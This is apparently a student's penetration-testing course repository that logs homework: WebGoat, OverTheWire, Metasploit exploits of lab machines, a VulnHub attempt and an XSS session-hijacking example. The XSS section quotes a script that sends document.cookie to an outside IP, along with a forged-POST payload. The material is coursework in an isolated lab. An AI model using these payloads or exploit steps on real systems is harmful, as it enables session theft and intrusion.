# Penetration Testing Course repository

Repository for Penetration test course in Haaga-Helia by Tero Karvinen

# H0 First assignment

The first assignment given is to analyze web traffic

## Starting point

Before the start of assignment Tero suggested to use Wireshark for this as it is one of the best free software to check on web traffic and as I have it and little bit of starting knowledge to use it I decided to use it for this assignment.

## First impressions on Wireshark

When first opened Wireshark there is no pop ups or anything that could be considered an annoyance which is good and the front page is very clean.

It basically shows all the adapters and such that are connected to a network on your computer

## WireShark Showcase

So what I did is I opened up the interface for my current internet connection and opened up my browser to get some traffic for my internet connection (IPv4 and IPv6 addresses are blurred out for security reasons)

![PenTestH0_1](https://user-images.githubusercontent.com/77589513/197475622-d1bd5d89-caad-43a4-9e73-9dae1a242f80.png)

So what am I supposed to tell by this information? Well basically I can see what kind of traffic I have going on within my network connection, where am I connected to and what type of protocol is the connection using.

# H1 First Homework

## First Assignment (x)

For the first assignment we were told to choose either an episode from herrasmieshakkerit podcast or Darknet Diaries and make a summary from that episode. First I checked out Darknet Diaries and immediately noticed episode 125 which was an interview with Jeremiah Roe about how he and his team had attempted to break into a company building for penetration testing which immedietaly made me choose it, because after all this is a penetration testing course. At first I was a little bit confused as it had started with an interview with a man called Michael Fagan and about how he broke into the buckingham palace incredibly easily. The interview lasted for about 10 minutes and it was quite interesting but then they moved into the actual interview with Jeremiah Roe. The interview started with explaining a little bit about Jeremiahs history and how he ended up in doing penetration testing at a contractor for the government that he worked for. Over the course of the interview they went over, well firstly how he even ended up to do the operation, what was the point for him to do so, which was to test if it was possible by someone with malicious intent to penetrate into that building, how to get access into data or even get access to even deeper into the government through that contractor organization and simply see how hard it would be. Jeremiah explained how he worked for Washington DC-based contractor that did a lot of work for the federal government, and since there were offices scattered in remote locations he then went on about how foreign countries don't always try to get into the governments networks, but instead go through contractors, since contractors do work for the government, they have to have some connection to government networks. So he explained all of the steps he had to do to do to test if this office was vulnerable or not.

Overall this interview was incredibly interesting, it gave a lot of insight in what penetration testing actually is and shows how a small and simple hole in security can be torn open and turn into a massive problem, and this is why penetration testing is vital for companies and especially government, so there is less chance of getting breached by malicious intruders.

## Second Assignment (a)

The next assignment was to install WebGoat and to test I can login on to it so first I installed Kali Linux virtual machine so I started by going to google and look up where to get the file to install a Kali linux virtual machine and found https://www.kali.org/ which is the home page for Kali linux so I downloaded Kali linux for virtualbox. I opened the folder, extracted it to desktop and double-clicked the "kali-linux-2022.3-virtualbox-amd64.vbox" file which automatically made a virtual machine on VirtualBox. Next I opened the virtual machine and the guide to install WebGoat 8 by Tero Karvinen (https://terokarvinen.com/2020/install-webgoat-web-pentest-practice-target/)
Next up I ran the command to install Java and other useful tools like ufw firewall and wget
> sudo apt-get -y install openjdk-11-jre ufw wget bash-completion

To download WebGoat I ran the command:

> wget https://terokarvinen.com/2020/install-webgoat-web-pentest-practice-target/webgoat-server-8.0.0.M26.jar

and

> java -jar webgoat-server-8.0.0.M26.jar

to run the server

Next I opened the link http://localhost:8080/WebGoat/ on the browser and registered a user successfully

## Third Assignment (b)

For the third assignment we were tasked to do the "HTTP Basics" and "Developer Tools" on WebGoat that we just finished installing and registering into. So HTTP Basics started by explaining how HTTP works. Next it literally shows how http can handle requests, so it tells you to input your name then press go and it reverses the name. For the last thing I was supposed to figure out the magic number, and there was even a tip to how to do it, but it required to install a program called "OWASP Zap" as it was suggested to be used. To download it I looked up a way and finally found a video "https://www.youtube.com/watch?v=9-jcs7Cm-iE". I installed OWASP Zap, but could not make it to actually accomplish to get anything so I figured out how to find the answer through the browsers own console and figured it out so in the console there is the file "attack2" I click into it and choose "Request" and it showed me the answer (picture as a reference)

![image](https://user-images.githubusercontent.com/77589513/198859675-a89bcd99-18a8-45f2-a01e-92c9665b2516.png)

So the answer was 90 instead of the 525 I first input and after I put 90 instead of 525 it gave me this response:

![image](https://user-images.githubusercontent.com/77589513/198859743-ba10f577-dccf-455b-8a59-38385791b4b5.png)

We were also told to finish the "Developer Tools" which started with explaining how you might need the developer tools for future assignments and what the different tabs are used for. The assignment says it's focusing on Google Chrome Developer Tools but you can use any other browser with developer tools so I decided to stay with Firefox. The first actual assignment on was to call a function

> webgoat.customjs.phoneHome()

with this function I got the response "phone homsaid {"lessonCompleted":true,"feedback":"Congratulations. You have succesfully completed the assignment.","output":"phoneHome Response is -1422190049"} and I was to type the number I received from the response into the textbox and after submitting it was completed.

As the next and last assignment for developer tools I was tasked with finding a specific HTTP request and read a randomized number from it. As this task was very similar to the magic number task from HTTP Basics ths was incredibly simple I press the button to get the request, find the correct HTTP request that contains a field "networkNum:", copied the number to the text box and verified it was the correct number.

## Fourth Assignment (c)

For this assignment the goal was to finish the levels 0-2 from Over The Wire bandit wargame.

First thing you is easy. All you have to do is connect to the host "bandit.labs.overthewire.org" on port "2220" the user and password is "bandit0". First level was to find the password to the next level which was in a readme file located in home directory. Just to make sure the file is there i used the command **ls** to list everything within that directory and there it was the readme file. I opened the file with the text editor "nano" with command **nano readme** and copied the password to the clipboard. Next I restarted putty to login to "bandit1" with the newly acquired password. To get to level 3 the password was located in a file called - which can be tricky since you can not just peek into a file with that kind of name. So I googled how to do it and came across this website (https://www.webservertalk.com/dashed-filename) and all I had to do was to use command cat which basically shows the contets of a file or files with a specification < between the command and the file name like "cat < -" and it printed the password for me.

## The fifth assignment (d)

Surprisingly it was just to install Kali linux wihich I already did and explained in the first assignment for the WebGoat.

## The sixth assignment (e)

This was the most challenging one out of them all as we were given the task to solve a problem from 2021 Challenge.fi.

It took me a while to figure out which challenge to do and decided to go with deciphering the challenge "Basic Ciphers 144". Reason to choose this one was simple, the hint told about ROT13 and while googling rot13 I came across a website called "rot13.com" and just tried dropping the flag there and surprise surprise it deciphered the flag and the result was "FLAG{well_this_was_easy}"

# H2 Homework

## First Assignment (x)

So for this assignment we were given a part of an article (Jaswal 2020: Mastering Metasploit - 4ed: Chapter 1: [Approaching a Penetration Test Using Metasploit](https://learning.oreilly.com/library/view/mastering-metasploit-/9781838980078/B15076_01_Final_ASB_ePub.xhtml#_idParaDest-30)) starting from "Conducting a penetration test with Metasploit" and read it all the way to the end and give a summary of the article.

### First

The article from the the given spot started with telling about the basic terms and commands used in metasploit

### Second

It mentions that if you are using Metasploit for the very first time you should check out their [Wiki](https://github.com/rapid7/metasploit-framework/wiki )

### Third

It explains the benefits of using Metasploit over just different tools and scripts

### Fourth

The article then goes on to how explains how to actually do an exercise of penetration testing with Metasploit

### Finally

It did say to summarize the text but also some videos but there was no videos at least to me so there was nothing to summarize on that.

## Second Assignment (a)

This assignment was to install Metasploitable 2 and install it into an isolated network with the attacking virtual machine. This is mostly based on my memory as I did this assignment already during the lecture.

### First things first

The attacking machine I used for this was a clone from a Kali Linux virtual machine I had previously installed ([here](https://github.com/Hexadxx/pentestcourse#second-assignment-a)). For the metasploitable 2 I first visited the original [website](https://docs.rapid7.com/metasploit/metasploitable-2/) to acquire the file. 

### Creating the Metasploitable machine

I created a new fresh Debian virtual machine but replaced the virtual hard disk with the Metasploitable file which turns the virtual machine into a metasploitable machine. 

### Setting up the network

Instead of immediately launching the metasploitable I went on to create a local network on VirtualBox which would be used to connect the attacking machine and the Metasploitable machine in the same network but to make it so it is not connected to the internet. For this I used this [article](https://carleton.ca/scs/2019/creating-a-new-host-only-adapter-in-virtualbox/) I found on google and then I set both the attacking machine and the Metasploitable one into the same isolated network.

## Third Assignment (b)

For this assignment we were told to do a port scan for our Metasploitable 2 machine and analyze the results. For this assignment I found a really nice video that shows how to do a simple port scan with Nmap or goes a little bit deeper with a tool called "Armitage" that is pre installed on Kali Linux but I decided to just stick with the default Nmap scan with terminal. I started with first getting the ip of my Metasploitable machine by typing ifconfig on the Metasploitable machine:

![image](https://user-images.githubusercontent.com/77589513/200136610-5484560a-8c78-4257-b90f-ae996d2337ac.png)

Next I just opened up my attacking machine and since it is Kali Linux, Nmap is already pre-installed on the machine so I opened up terminal and just scanned the ports with the command "nmap 192.168.56.5" Here is the result:

![image](https://user-images.githubusercontent.com/77589513/200136756-409caa67-2ebc-41d8-af24-f46e490caf8a.png)

The assignment also told us to use different techniques like banner grabbing or NSE. So before this lecture I was not aware of what these things were so after a quick googling I found out that banner grabbing is about collecting data from target system ([source](https://www.hackingarticles.in/multiple-ways-to-banner-grabbing/)). NSE aka Nmap Scripting Engine is a way for users to write and share simple scripts to automate a wide variety of network tasks ([source](https://nmap.org/book/man-nse.html)). So I decided to try banner grabbing and used NetCat for it which grabs the protocol version here is 2 examples from ports 21 and 22: 

![image](https://user-images.githubusercontent.com/77589513/200150045-4f7e636e-afc8-4cb5-9ff0-265af3ca3632.png) ![image](https://user-images.githubusercontent.com/77589513/200150051-83a4a204-b680-449d-b807-8abc37443393.png)

So basically from all of this I concluded that with these tools you cand find out the ports that are open which can possibly be exploited and use to gain access to the computer.

Finally to wrap this assignment we were told to save the port scan results in metasploit database and files. To figure this out I googled about it and found a good [article](https://www.offensive-security.com/metasploit-unleashed/using-databases/) about it. So as mentioned in the article you need to start postgresql on your attacking Kali machine to use the database so I start the service with

> systemctl start postgresql

After postgresql is started I initialized the database with the command

> sudo msfdb init

and as there is no database it will create one. Here is a picture apparently in the article it says msfdb init is enough but it said it requires to be run as root:

![image](https://user-images.githubusercontent.com/77589513/200152190-bbbc494b-6703-4d3e-85cf-f8705e276b50.png)

To test the database is connected to metasploit I checked by first running msfconsole and using the command:

>  db_status

and receiving the result: ![image](https://user-images.githubusercontent.com/77589513/200152539-eae941a9-9e3b-4b1d-a135-83e726a1799c.png)

Then to do a port scan and importing to database I decided to use a workspace to keep it clean. So first I made a workspace with the command: 

> workspace -a msfu

then opened the workspace with the command "workspace msfu" to test this I just ran the command workspace which shows your current workspace.
Now to do an import I first ran a db_nmap 192.168.56.5 to run a port scan that can be imported to the database then import it to the workspace. After trying to import the port scan into the database it says db_import command not found. Okay I resolved so it seems when doing the port scan you have to add --save at the end of the command so it saves it to a file.

![image](https://user-images.githubusercontent.com/77589513/200177791-295a728b-ee3d-4ffc-9889-1e7199fc3652.png)
![image](https://user-images.githubusercontent.com/77589513/200177807-bf53a608-b592-4627-b9e7-abe3bc1c573d.png)

Next I just copied the path of the .xml file path and imported it to database with the command:

> db_import (file-path) 

![image](https://user-images.githubusercontent.com/77589513/200178092-9e8abb5d-34b2-42ce-8d4d-3ade670f9f6b.png)

## Fourth Assignment (c)
For this assignment we were told to break into the metasploitable machine so i looked up how to do that in the google. I found this really good [article](https://www.golinuxcloud.com/learn-hacking-using-metasploitable-2/) which goes on about how to find the exploits and how to break into the metasploitable machine. So I tried the first method which is using FTP service that is on port 21. In the guide it used the command nmap with the addtionals of -sV and -O but they did not work for some reason so I just used the standard nmap command which did not give as much information but still it let me know the port for ftp so I can use that information to figure out the exploit for it. Thankfully there is already a database of different exploits in metasploit so I just open up the metasploit console and look up the exploit for ftp with search command. So following the next step I setup the remote host (set RHOSTS 192.168.56.5 aka the metasploitable ip) then ran the exploit by just running the command run. And now I am able to make changes in the target system. Here is a picture of me getting into the system 
![image](https://user-images.githubusercontent.com/77589513/200182937-e2964784-3be6-4296-ad67-d6685c61de7f.png)

## Fifth Assgnment (d)

For this assignment we just needed to get into the target system using another method so I decided to try and use the exploit to get into the target machine by using the exploit of getting the VNC password (The guide for this was on the same [website](https://www.golinuxcloud.com/learn-hacking-using-metasploitable-2/) as the previous one) in port 5900 so I look up the exploit from the database with "search vnc login" then once again just use the exploit with command "use (exploit-path in this case: auxiliary/scanner/vnc/vnc_login) and ran it and here is the result: 
![image](https://user-images.githubusercontent.com/77589513/200183784-a34b45f4-ac89-4209-acac-58d1158b9cd0.png)

As you can see on the second line it shows "Login Succesful:password" which shows it was able to crack the password which is funnily enough "password".
So next I just opened ran vncviewer with the target system ip and using the password "password" I was able to open up a vnc connection as shown below:
![image](https://user-images.githubusercontent.com/77589513/200183994-1282fb9c-a46a-415b-874a-83d2aed5d14c.png)

## Sixth Assignment (e)
For this assignment we were given the task of breaking into a VulnHub machine so I opened up the [website](https://www.vulnhub.com/) and decided to go with the Jangow machine as it sounded cool. So first off I installed the virtual machine, made sure it is connected to the local network and not the internet and opened it up.
![image](https://user-images.githubusercontent.com/77589513/200185169-a481d0d2-a867-4a74-ac7a-d4180e61a213.png)

So it clrearly already gives the IP for the machine on the login screen so that means I can do a port scan of the machine with nmap and so I did and here is the result: 
![image](https://user-images.githubusercontent.com/77589513/200186047-685638d7-b41a-4ecc-be11-6ac3f42c08d9.png)

So I can tell ssh and FTP ports are open and decided to try the FTP exploit that I did earlier to get access to metasploitable machine through FTP but it seems because the FTP version is too new the exploit does not work for this machine so I decided to look up Jangow on google, and found a great [guide](https://resources.infosecinstitute.com/topic/jangow-1-0-1-ctf-walkthrough/) on jangow so I redo the nmap command but this time with the switch "-sV" and the option "-p-" so "nmap 192.168.56.118 -p- -sV" and here is the result:

![image](https://user-images.githubusercontent.com/77589513/200187024-2a14b663-52c2-467b-b5a6-4f230aceb2b9.png)

So here it clearly says the FTP version s 3.0.3 where the exploit was for FTP version 2.4.3. The scan also showed that the http port was open so I opened the ip address on the browser and here is what it shows:

![image](https://user-images.githubusercontent.com/77589513/200187674-45ad2f59-9b08-4906-87fc-5f5fe77b210f.png)

So it seems there is a nice website being ran on the machine. So I follow the article and use dirb which is a web application and file and folder enumeration tool on the jangow ip.

so I ran the command: "dirb http://192.168.56.118/" and the dirb scan identified a wordpress folder so lets open the folder into the browser. So the website looks very different from the articles as it seems like it does not have any CSS. So I tried the different links and it seems buscar was not working so it means the website is probably still in construction. So I followed the article and opened the Burp Suite but after fighting with this for hours I realized even if I could follow through the article and repeat the actions does not mean I would actually understand what I am doing at that time like I tried using burp I interecpted the address http://192.168.56.118/ste/busque.php=buscar=  and it intercepts the request I send it to repeater but nothing happens it does not do what it did in the article so I could not move forward with the machine.

# H3 SELECT pwned

## First Assignment (x)

For this assignment as usual the x assignments are to summarize videos or articles given. For the first thing to be summarized this time was to summarize the [OWASP Top 10 of 2017](https://terokarvinen.com/2022/tunkeutumistestaus-ict4tn027-3010-syksylla-2022/owasp-top-10-2017.pdf)

- OWASP comes from words "The Open Web Application Security Project" it is a project or organization that is unaffiliated with any tech company and gives unbiased, practical, and cost-effective information about application security.
- OWASP Top 10 is a yearly updated list of "The Ten Most Critical Web Application Security Risks"
- The article also explains what are application risks generally.
- The article also explains the different risks that are in the top 10 in depth

Next up there is a full course about [cross site scripting](https://learning.oreilly.com/videos/the-complete-ethical/9781839210495/9781839210495-video21_1) a total of 7 videos.

- Well the first video explains the subject of this course
- Next up it explains what Cross site scripting is or AKA XSS
- Next it explains what Reflected Cross Site Scripting is and how to use it
- Next it explains what Stored Cross Site Scripting is, how it works and how to use it.
- In the video it also explains the difference between Reflected and Stored Cross Site Scripting.
- Next it shows how to do real hacking with Cross Site Scripting and BeEF
- Finally it shows how to protect from these kinds of attacks.

## Second assignment (y)

For the next assignment we have to create a story or like an example of a XSS attack so of course the first thing I do is google "XSS Attack example" and find a [article](https://websitesecuritystore.com/blog/real-world-cross-site-scripting-examples/) about real life examples of XSS attacks. So for this example I am trying to explain about Session Hijacking. Basically web applications store user sessions to identify the user in the future from multiple HTTP requests. Sessions are also identified through session cookies like when a user logs in to a web application the server will send a session cookie to the user using the Set-Cookie header. So if the user accesses any page in the application or submits a form it will store the web browsers cookie in the requests sent to the server and because of that the server is able to identify the user. Basically what this means is cookies contain critical information and attackers can use them to impersonate as legitimate users to access a user's existing web session and this is what is called User Session Hijacking.

So let's start with what the attacker does. So first they will attempt to steal the cookies so the attacker provides a pyload that sends the cookie value to the malicious website of the attacker

> <script>new Image().src="https://192.165.159.122/fakepg.php?output="+document.cookie;</script>

This script is from the article so it's from an example and what this basically does is it creates a Image object within the Document Object Model or DOM for short while setting the src attribte toward the website of the malicious attacker. Ultimately, the browser will make an HTTP request for the malicious attackers website. After that the attacker's website will send the cookike to the web server "http://localhost:81/DVWA/vulnerabilities/xss_r/?name=<script>new Image().src="https:// 192.165.159.122/fakepg.php?output="+document.cookie;</script>" So browser gets a request -> JavaScript Payload gets executed further -> and then goes on to making a new request to the attacker's website along with the cookie value within the URL. So let's get inside the victims user session using the cookie value we gained through the XSS mentioned. So to do that you have to forge an HTTP POST request towards the Guestbook page. Here is the payload that creates an XMLHTTPRequest object that set an important data and header

> <script>
var xhr = new XMLHttpRequest(); xhr.open('POST','http://localhost:81/DVWA/vulnerabilities/xss_s/',true);
xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
xhr.send('txtName=xss&mtxMessage=xss&btnSign=Sign+Scrapbook');
</script>

and once the script has executed it generated a new request for adding a comment by pretending to be the legit user and that is how you hijack a web session.

## Third Assignment (a)

This assignment is to solve the first 2 tutorials from [SQLZoo](https://sqlzoo.net/wiki/SQL_Tutorial) 0 Select basics and 1 SELECT name. So I immediately just jumped in and opened up the first one SELECT basics. I was introduced how to look for data using SELECT method and different clauses to specify it in SQL.
